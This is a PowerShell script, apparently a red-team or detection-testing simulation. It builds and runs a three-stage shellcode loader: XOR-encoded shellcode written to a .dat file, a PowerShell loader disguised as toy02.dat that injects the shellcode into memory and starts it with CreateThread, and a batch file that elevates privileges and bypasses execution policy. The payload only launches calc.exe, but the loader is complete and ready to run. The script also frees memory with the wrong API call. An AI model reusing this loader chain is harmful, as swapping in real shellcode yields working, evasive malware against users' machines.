$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This script requires Administrator privileges. Relaunching as Administrator..."
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}


$desktopPath = "C:\Users\win\Desktop"
if (-not (Test-Path $desktopPath)) {
    Write-Host "Error: Desktop path $desktopPath does not exist."
    exit 1
}
Set-Location $desktopPath

$shellcode = [byte[]]@(0xFC,0xE8,0x82,0x00,0x00,0x00,0x60,0x89,0xE5,0x31,0xC0,0x64,0x8B,0x50,0x30,0x8B,0x52,0x0C,0x8B,0x52,0x14,0x8B,0x72,0x28,0x0F,0xB7,0x4A,0x26,0x31,0xFF,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0xC1,0xCF,0x0D,0x01,0xC7,0xE2,0xF2,0x52,0x57,0x8B,0x52,0x10,0x8B,0x4A,0x3C,0x8B,0x4C,0x11,0x78,0xE3,0x48,0x01,0xD1,0x51,0x8B,0x59,0x20,0x01,0xD3,0x8B,0x49,0x18,0xE3,0x3A,0x49,0x8B,0x34,0x8B,0x01,0xD6,0x31,0xFF,0xAC,0xC1,0xCF,0x0D,0x01,0xC7,0x38,0xE0,0x75,0xF6,0x03,0x7D,0xF8,0x3B,0x7D,0x24,0x75,0xE4,0x58,0x8B,0x58,0x24,0x01,0xD3,0x66,0x8B,0x0C,0x4B,0x8B,0x58,0x1C,0x01,0xD3,0x8B,0x04,0x8B,0x01,0xD0,0x89,0x44,0x24,0x24,0x5B,0x5B,0x61,0x59,0x5A,0x51,0xFF,0xE0,0x5F,0x5F,0x5A,0x8B,0x12,0xEB,0x8D,0x5D,0x6A,0x01,0x8D,0x85,0xB2,0x00,0x00,0x00,0x50,0x68,0x31,0x8B,0x6F,0x87,0xFF,0xD5,0xBB,0xE0,0x1D,0x2A,0x0A,0x68,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x00,0x53,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00)
$key = [byte[]]@(0x5F,0x3A,0x7C,0x19)
$encoded = for ($i = 0; $i -lt $shellcode.Length; $i++) { $shellcode[$i] -bxor $key[$i % $key.Length] }
$tempPath = [System.IO.Path]::GetTempPath()
$toy01Path = Join-Path $tempPath "toy01.dat"
try {
    [System.IO.File]::WriteAllBytes($toy01Path, $encoded)
    Write-Host "Created $toy01Path"
}
catch {
    Write-Host "Error: Failed to create $toy01Path : $_"
    exit 1
}

# PowerShell loader
$toy02Content = @'

# Initialize memory pointer
$mem = [IntPtr]::Zero

try {
    # Get temp folder path
    $tempPath = [System.IO.Path]::GetTempPath()
    $stage2Path = Join-Path $tempPath "toy01.dat"

    # XOR key for decoding (simple obfuscation for simulation)
    $key = [byte[]]@(0x5F, 0x3A, 0x7C, 0x19)

    # Read encoded payload from toy01.dat
    if (-not [System.IO.File]::Exists($stage2Path)) {
        throw "Payload file toy01.dat not found at $stage2Path"
    }
    $encodedData = [System.IO.File]::ReadAllBytes($stage2Path)
    
    # Decode XOR-transformed data
    $decodedData = New-Object byte[] $encodedData.Length
    for ($i = 0; $i -lt $encodedData.Length; $i++) {
        $decodedData[$i] = $encodedData[$i] -bxor $key[$i % $key.Length]
    }

    # P/Invoke definitions for memory operations
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
"@

    # Allocate memory (RWX for simplicity; real-world would stage RW->RX)
    $memSize = $decodedData.Length
    $mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    if ($mem -eq [IntPtr]::Zero) {
        throw "Memory allocation failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }

    # Copy decoded shellcode to allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($decodedData, 0, $mem, $memSize)

    # Change memory to RX for execution
    $oldProtect = 0
    [Win32]::VirtualProtect($mem, $memSize, 0x20, [ref]$oldProtect) # PAGE_EXECUTE_READ

    # Create thread to execute shellcode (launches calc.exe)
    $threadId = 0
    $threadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
    if ($threadHandle -eq [IntPtr]::Zero) {
        throw "Thread creation failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }

    # Wait for thread to complete (infinite for sim)
    [Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
}
catch {
    Write-Error "Loader failed: $_"
    exit 1
}
finally {
    # Clean up memory only if allocated
    if ($mem -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
    }
}
'@
$toy02Path = Join-Path $desktopPath "toy02.dat"
try {
    [System.IO.File]::WriteAllText($toy02Path, $toy02Content)
    Write-Host "Created $toy02Path"
}
catch {
    Write-Host "Error: Failed to create $toy02Path : $_"
    exit 1
}


$toy03Content = @'
@echo off
:: Simulated batch file to invoke toy02.dat PowerShell loader
:: Ensures correct execution as PowerShell script (MITRE ATT&CK: T1059.001, T1055)

:: Check for Administrator privileges
net session >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo This script requires Administrator privileges. Requesting elevation...
    powershell -Command "Start-Process cmd.exe -ArgumentList '/c %~f0' -Verb RunAs"
    exit /b
)

:: Verify toy02.dat exists in current directory
if not exist "%~dp0toy02.dat" (
    echo Error: toy02.dat not found in %~dp0
    exit /b 1
)

:: Copy toy02.dat to temp folder
copy "%~dp0toy02.dat" "%TEMP%\toy02.dat" >nul
if %ERRORLEVEL% neq 0 (
    echo Error: Failed to copy toy02.dat to %TEMP%
    exit /b %ERRORLEVEL%
)

:: Run PowerShell loader using -Command to handle .dat extension
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Get-Content -Path '%TEMP%\toy02.dat' -Raw)"
if %ERRORLEVEL% neq 0 (
    echo Error: Failed to execute PowerShell loader. Ensure toy01.dat exists in %TEMP% and cmd.exe is run as Administrator.
    exit /b %ERRORLEVEL%
)

echo Success: PowerShell loader executed. Check for calc.exe.
exit /b 0
'@
$toy03Path = Join-Path $desktopPath "toy03.bat"
try {
    [System.IO.File]::WriteAllText($toy03Path, $toy03Content)
    Write-Host "Created $toy03Path"
}
catch {
    Write-Host "Error: Failed to create $toy03Path : $_"
    exit 1
}


try {
    Write-Host "Executing $toy03Path..."
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $toy03Path" -Verb RunAs -PassThru
    $process.WaitForExit()
    if ($process.ExitCode -eq 0) {
        Write-Host "Success: calc.exe should have launched. Check Task Manager."
    } else {
        Write-Host "Error: toy03.bat failed with exit code $($process.ExitCode). Check logs above."
        Write-Host "Try running cmd.exe as Administrator and execute $toy03Path manually."
    }
}
catch {
    Write-Host "Error: Failed to execute $toy03Path : $_"
    Write-Host "Try running cmd.exe as Administrator and execute $toy03Path manually."
    exit 1
}
